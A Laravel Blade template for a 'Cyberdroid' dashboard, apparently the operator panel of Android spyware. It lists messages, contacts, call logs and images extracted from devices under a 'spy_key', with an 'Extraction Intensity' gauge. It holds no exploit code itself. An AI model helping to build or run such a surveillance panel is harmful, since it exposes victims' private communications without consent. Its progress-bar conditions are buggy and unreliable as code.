@extends('base.index')

@section('content')
    <!-- Content Header (Page header) -->
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">Dashboard</h1>
                </div><!-- /.col -->
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="#">Home</a></li>
                        <li class="breadcrumb-item active">Cyber<b>droid</b></li>
                    </ol>
                </div><!-- /.col -->
            </div><!-- /.row -->
        </div><!-- /.container-fluid -->
    </div>
    <!-- /.content-header -->
    <section class="content">
        <div class="container-fluid">
            <!-- Small boxes (Stat box) -->
            <div class="row">
                <div class="col-lg-3 col-6">
                    <!-- small box -->
                    <div class="small-box bg-danger">
                        <div class="inner">
                            <h3>{{ $total_messages }}</h3>

                            <p>Messages</p>
                        </div>
                        <div class="icon">
                            <i class="fa fa-mail-bulk"></i>
                        </div>
                        <a href="{{ route('messages.index', \Illuminate\Support\Facades\Auth::user()->spy_key) }}" class="small-box-footer">More info <i class="fas fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <!-- ./col -->
                <div class="col-lg-3 col-6">
                    <!-- small box -->
                    <div class="small-box bg-success">
                        <div class="inner">
                            <h3>{{ $total_contacts }}</h3>

                            <p>Contacts</p>
                        </div>
                        <div class="icon">
                            <i class="fa fa-address-book"></i>
                        </div>
                        <a href="{{ route('contacts.index', \Illuminate\Support\Facades\Auth::user()->spy_key) }}" class="small-box-footer">More info <i class="fas fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <!-- ./col -->
                <div class="col-lg-3 col-6">
                    <!-- small box -->
                    <div class="small-box bg-info">
                        <div class="inner">
                            <h3>{{ $total_call_logs }}</h3>

                            <p>Call Logs</p>
                        </div>
                        <div class="icon">
                            <i class="fa fa-phone"></i>
                        </div>
                        <a href="{{ route('call_logs.index', \Illuminate\Support\Facades\Auth::user()->spy_key) }}" class="small-box-footer">More info <i class="fas fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <!-- ./col -->
                <div class="col-lg-3 col-6">
                    <!-- small box -->
                    <div class="small-box bg-warning">
                        <div class="inner">
                            <h3>{{ $total_images }}</h3>

                            <p>Images</p>
                        </div>
                        <div class="icon">
                            <i class="fa fa-images"></i>
                        </div>
                        <a href="{{ route('images.index', \Illuminate\Support\Facades\Auth::user()->spy_key) }}" class="small-box-footer">More info <i class="fas fa-arrow-circle-right"></i></a>
                    </div>
                </div>
                <!-- ./col -->
            </div>
            <!-- /.row -->
            <!-- Main row -->
            <div class="row">
                <!-- Left col -->
                <section class="col-lg-6 connectedSortable">
                    <!-- MESSAGES -->
                    <div class="card card-outline card-danger">
                        <div class="card-header">
                            <h3 class="card-title">Latest Messages</h3>
                        </div>
                        <!-- /.card-header -->
                        <div class="card-body p-0">
                            @if($message->isEmpty())
                                <p class="text-center">no messages found</p>
                            @else
                                <table class="table">
                                    <thead>
                                    <tr>
                                        <th>Id</th>
                                        <th>Phone Number</th>
                                        <th>Date Extracted</th>
                                        <th style="width: 40px">Status</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    @foreach($message as $sms)
                                        <tr>
                                            <td>{{ $sms->message_id }}</td>
                                            <td>{{ $sms->phone_number }}</td>
                                            <td>{{ $sms->created_at }}</td>
                                            <td><span class="text-danger"><i class="fa fa-check-circle"></i></span></td>
                                        </tr>
                                    @endforeach
                                    </tbody>
                                </table>
                            @endif
                        </div>
                        <!-- /.card-body -->
                    </div>
                    <!--/.MESSAGES -->

                    <!-- CONTACTS -->
                    <div class="card card-outline card-success">
                        <div class="card-header">
                            <h3 class="card-title">Latest Contacts</h3>
                        </div>
                        <!-- /.card-header -->
                        <div class="card-body p-0">
                            @if($contact->isEmpty())
                                <p class="text-center">no contacts found</p>
                            @else
                                <table class="table">
                                    <thead>
                                    <tr>
                                        <th>Id</th>
                                        <th>Phone Number</th>
                                        <th>Contact Name</th>
                                        <th style="width: 40px">Status</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    @foreach($contact as $cont)
                                        <tr>
                                            <td>{{ $cont->contact_id }}</td>
                                            <td>{{ $cont->phone_number }}</td>
                                            <td>{{ $cont->contact_name }}</td>
                                            <td><span class="text-success"><i class="fa fa-check-circle"></i></span></td>
                                        </tr>
                                    @endforeach
                                    </tbody>
                                </table>
                            @endif
                        </div>
                        <!-- /.card-body -->
                    </div>
                    <!--/.CONTACTS -->

                </section>
                <!-- /.Left col -->
                <!-- right col (We are only adding the ID to make the widgets sortable)-->
                <section class="col-lg-6 connectedSortable">
                    <!---Progress--->
                    <div class="card card-outline card-dark">
                        <div class="card-header">
                            <h3 class="card-title">Cyberdroid Progress</h3>

                        </div>
                        <!-- /.card-header -->
                        <div class="card-body p-0">
                            <table class="table">
                                <thead>
                                <tr>
                                    <th style="width: 10px">#</th>
                                    <th>Task</th>
                                    <th>Progress</th>
                                    <th style="width: 40px">Label</th>
                                </tr>
                                </thead>
                                <tbody>
                                <tr>
                                    <td>1.</td>
                                    <td>Messages</td>
                                    @if($total_messages == 0)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-danger" style="width: 0"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-danger">0%</span></td>
                                    @endif
                                    @if($total_messages <= 100)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-warning" style="width: 15%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-warning">15%</span></td>
                                    @endif
                                    @if($total_messages > 150 && $total_messages < 200)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-primary" style="width: 55%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-primary">55%</span></td>
                                    @endif
                                    @if($total_messages > 300)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-success" style="width: 65%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-success">65%</span></td>
                                    @endif
                                </tr>

                                <tr>
                                    <td>2.</td>
                                    <td>Contacts</td>
                                    @if($total_contacts == 0)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-danger" style="width: 0"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-danger">0%</span></td>
                                    @endif
                                    @if($total_contacts <= 100)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-warning" style="width: 15%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-warning">15%</span></td>
                                    @endif
                                    @if($total_contacts > 150 && $total_contacts < 200)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-primary" style="width: 55%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-primary">55%</span></td>
                                    @endif
                                    @if($total_contacts > 300)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-success" style="width: 95%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-success">95%</span></td>
                                    @endif
                                </tr>
                                <tr>
                                    <td>3.</td>
                                    <td>Call logs</td>
                                    @if($total_call_logs == 0)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-danger" style="width: 0"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-danger">0%</span></td>
                                    @endif
                                    @if($total_call_logs <= 100)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-warning" style="width: 15%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-warning">15%</span></td>
                                    @endif
                                    @if($total_call_logs > 150 && $total_call_logs < 200)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-primary" style="width: 55%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-primary">55%</span></td>
                                    @endif
                                    @if($total_call_logs > 300)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-success" style="width: 77%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-success">77%</span></td>
                                    @endif
                                </tr>
                                <tr>
                                    <td>4.</td>
                                    <td>Images</td>
                                    @if($total_images == 0)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-danger" style="width: 0"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-danger">0%</span></td>
                                    @endif
                                    @if($total_images <= 100)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-warning" style="width: 15%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-warning">15%</span></td>
                                    @endif
                                    @if($total_images > 150 && $total_images < 200)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-primary" style="width: 55%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-primary">55%</span></td>
                                    @endif
                                    @if($total_images > 300)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-success" style="width: 70%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-success">70%</span></td>
                                    @endif
                                </tr>
                                <tr>
                                    <td>5.</td>
                                    <td>Extraction Intensity</td>
                                    @if($total_items == 0)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-danger" style="width: 15%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-danger">15%</span></td>
                                    @endif
                                    @if($total_items > 200 && $total_items < 300)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-warning" style="width: 45%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-warning">45%</span></td>
                                    @endif
                                    @if($total_items > 300 && $total_items < 500)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-primary" style="width: 65%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-primary">65%</span></td>
                                    @endif
                                    @if($total_items > 550)
                                        <td>
                                            <div class="progress progress-xs">
                                                <div class="progress-bar bg-success" style="width: 85%"></div>
                                            </div>
                                        </td>
                                        <td><span class="badge bg-success">85%</span></td>
                                    @endif
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <!-- /.card-body -->
                    </div>
                    <!--- .Progress--->

                    <!-- CALL LOGS -->
                    <div class="card card-outline card-info">
                        <div class="card-header">
                            <h3 class="card-title">Latest Call Logs</h3>
                        </div>
                        <!-- /.card-header -->
                        <div class="card-body p-0">
                            @if($call_log->isEmpty())
                                <p class="text-center">no call logs found</p>
                            @else
                                <table class="table">
                                    <thead>
                                    <tr>
                                        <th>Id</th>
                                        <th>Phone Number</th>
                                        <th>Call Name</th>
                                        <th>Date</th>
                                        <th style="width: 40px">Status</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    @foreach($call_log as $logs)
                                        <tr>
                                            <td>{{ $logs->call_id }}</td>
                                            <td>{{ $logs->phone_number }}</td>
                                            <td>{{ $logs->call_name }}</td>
                                            <td>{{ $logs->call_date }}</td>
                                            <td><span class="text-info"><i class="fa fa-check-circle"></i></span></td>
                                        </tr>
                                    @endforeach
                                    </tbody>
                                </table>
                            @endif
                        </div>
                        <!-- /.card-body -->
                    </div>
                    <!--/.CALL LOGS -->
                </section>
                <!-- right col -->
            </div>
            <!-- /.row (main row) -->
        </div><!-- /.container-fluid -->
    </section>
@endsection
